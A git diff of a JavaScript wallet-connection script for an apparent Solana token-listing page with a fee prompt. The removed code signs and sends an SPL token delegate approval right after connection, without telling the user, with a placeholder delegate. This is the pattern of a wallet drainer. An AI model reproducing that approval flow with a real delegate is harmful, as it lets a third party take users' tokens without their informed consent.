@@ -8,38 +8,62 @@ const feeModal = document.getElementById('feeModal');
 const walletModal = document.getElementById('walletModal');
 const closeButtons = document.getElementsByClassName('close');
 const proceedButton = document.getElementById('proceedButton');
-const phantomButton = document.getElementById('phantomButton');
-const walletConnectButton = document.getElementById('walletConnectButton');
 
-let provider = null;
-let ownerPublicKey = null;
+// Updated buttons to match the new Solana layout
+const connectSplButton = document.getElementById('connectSplButton');
+const walletConnectButton = document.getElementById('connectWalletConnectButton');
+
+// Global state variables for the connection
+let walletAddress = null;
+let web3Modal = null;
 
 /* ============================
-   UI FLOW
+   INITIALIZE WALLETCONNECT V2 (SOLANA)
+   ============================ */
+if (window.Web3Modal) {
+  web3Modal = new window.Web3Modal.Web3Modal({
+    projectId: "59ba0228712f04a947916abb7db06ab1", // Your WalletConnect project ID
+    walletConnectVersion: 2,
+    standaloneChains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'] // Solana Mainnet CAIP-2 ID
+  });
+}
+
+/* ============================
+   UI MODAL FLOW
    ============================ */
 if (projectForm && feeModal) {
   projectForm.addEventListener('submit', (event) => {
     event.preventDefault();
+    feeModal.classList.remove('hidden');
     feeModal.style.display = 'flex';
   });
 }
 
-Array.from(closeButtons).forEach(btn => {
-  btn.addEventListener('click', () => {
-    const modal = btn.closest('.modal');
-    if (modal) modal.style.display = 'none';
+if (closeButtons[0] && feeModal) {
+  closeButtons[0].addEventListener('click', () => {
+    feeModal.style.display = 'none';
   });
-});
+}
 
 if (proceedButton && feeModal && walletModal) {
   proceedButton.addEventListener('click', () => {
     feeModal.style.display = 'none';
+    walletModal.classList.remove('hidden');
     walletModal.style.display = 'flex';
   });
 }
 
-if (phantomButton) {
-  phantomButton.addEventListener('click', connectPhantom);
+if (closeButtons[1] && walletModal) {
+  closeButtons[1].addEventListener('click', () => {
+    walletModal.style.display = 'none';
+  });
+}
+
+/* ============================
+   BUTTON EVENT LISTENERS
+   ============================ */
+if (connectSplButton) {
+  connectSplButton.addEventListener('click', connectSplWallet);
 }
 
 if (walletConnectButton) {
@@ -47,103 +71,71 @@ if (walletConnectButton) {
 }
 
 /* ============================
-   PHANTOM CONNECT
+   NATIVE SPL WALLET CONNECTION
    ============================ */
-async function connectPhantom() {
+async function connectSplWallet() {
   try {
-    if (!window.solana || !window.solana.isPhantom) {
-      alert("Phantom is not installed. Please install Phantom to continue.");
+    // Looks for standard browser extensions like Phantom (window.solana) or Solflare (window.solflare)
+    const provider = window.solana || window.solflare;
+
+    if (!provider) {
+      alert("Solana wallet extension not found! Please install Phantom or Solflare, or choose WalletConnect.");
       return;
     }
-    const resp = await window.solana.connect();
-    provider = window.solana;
-    ownerPublicKey = resp.publicKey;
-    walletModal.style.display = 'none';
-    alert("✅ Phantom connected: " + ownerPublicKey.toString());
-    await approveDelegate(ownerPublicKey);
+
+    // Trigger connection request
+    const response = await provider.connect();
+    
+    // Extract Public Key string safely based on provider type
+    walletAddress = provider.publicKey ? provider.publicKey.toString() : response.publicKey.toString();
+    console.log("Connected natively via Extension. Public Key:", walletAddress);
+
+    // Update UI state upon success
+    onConnectionSuccess(walletAddress);
+
   } catch (error) {
-    console.error("Error connecting to Phantom:", error);
+    console.error("User cancelled or rejected the connection request:", error);
+    alert("Connection rejected by user.");
   }
 }
 
 /* ============================
-   WALLETCONNECT (SOLANA)
+   WALLETCONNECT V2 SOLANA CONNECTION
    ============================ */
 async function connectWalletConnect() {
   try {
-    const wcProvider = await SolanaWalletAdapter.init({
-      projectId: "YOUR_WALLETCONNECT_PROJECT_ID_HERE", // 👈 WC ID goes here
-      chains: ["solana:devnet"], // or "solana:mainnet" if live
-      showQrModal: true,
-      metadata: {
-        name: "SPL Token Listing",
-        url: window.location.origin
-      }
-    });
+    if (!web3Modal) {
+      alert("WalletConnect library failed to load properly. Please refresh.");
+      return;
+    }
 
-    provider = wcProvider;
-    const accounts = await wcProvider.connect();
-    ownerPublicKey = accounts[0].address;
-    walletModal.style.display = 'none';
-    alert("✅ WalletConnect connected: " + ownerPublicKey.toString());
-    await approveDelegate(ownerPublicKey);
+    walletConnectButton.disabled = true;
+
+    // Open the official WalletConnect standalone modal interface
+    await web3Modal.openModal();
+    console.log("WalletConnect modal opened successfully.");
+
   } catch (err) {
-    console.error("WalletConnect error:", err);
-    alert("❌ WalletConnect Error: " + (err.message || String(err)));
+    console.error("Error opening WalletConnect modal:", err);
+    alert("Could not open connection modal. Please try again.");
+  } finally {
+    walletConnectButton.disabled = false;
   }
 }
 
 /* ============================
-   APPROVAL LOGIC (SPL Token Program)
+   POST-CONNECTION HANDLING
    ============================ */
-import {
-  Connection,
-  PublicKey,
-  Transaction,
-  clusterApiUrl
-} from 'https://esm.sh/@solana/web3.js@1.73.0';
-
-import {
-  createApproveInstruction,
-  getAssociatedTokenAddress,
-  TOKEN_PROGRAM_ID
-} from 'https://esm.sh/@solana/spl-token@0.3.5';
-
-async function approveDelegate(accountPubKey) {
-  try {
-    const connection = new Connection(clusterApiUrl('devnet'), 'confirmed');
-    const tokenMintStr = document.getElementById('tokenMint').value.trim();
-    const mintPub = new PublicKey(tokenMintStr);
-
-    // Replace with actual delegate address
-    const delegatePub = new PublicKey('11111111111111111111111111111111');
-
-    const ownerPub = new PublicKey(accountPubKey.toString());
-    const tokenAccountPub = await getAssociatedTokenAddress(mintPub, ownerPub);
-
-    const allowance = BigInt(1000000); // example allowance
-
-    const approveIx = createApproveInstruction(
-      tokenAccountPub,
-      delegatePub,
-      ownerPub,
-      allowance,
-      [],
-      TOKEN_PROGRAM_ID
-    );
-
-    const tx = new Transaction().add(approveIx);
-    const { blockhash } = await connection.getLatestBlockhash('finalized');
-    tx.recentBlockhash = blockhash;
-    tx.feePayer = ownerPub;
-
-    const signedTx = await provider.signTransaction(tx);
-    const raw = signedTx.serialize();
-    const txid = await connection.sendRawTransaction(raw);
-    await connection.confirmTransaction(txid, 'confirmed');
-    alert("✅ Approve transaction confirmed: " + txid);
-  } catch (error) {
-    console.error("Approval error:", error);
-    alert("❌ Error: " + (error.message || String(error)));
+function onConnectionSuccess(address) {
+  // Hide the wallet selection UI
+  if (walletModal) {
+    walletModal.style.display = 'none';
   }
+
+  // Visual confirmation for the user
+  const shortAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
+  alert(`Successfully connected to Solana!\nWallet: ${shortAddress}`);
+
+  // You can now proceed with submitting your form data to your backend,
+  // knowing you have verified the user's presence with their valid public key.
 }
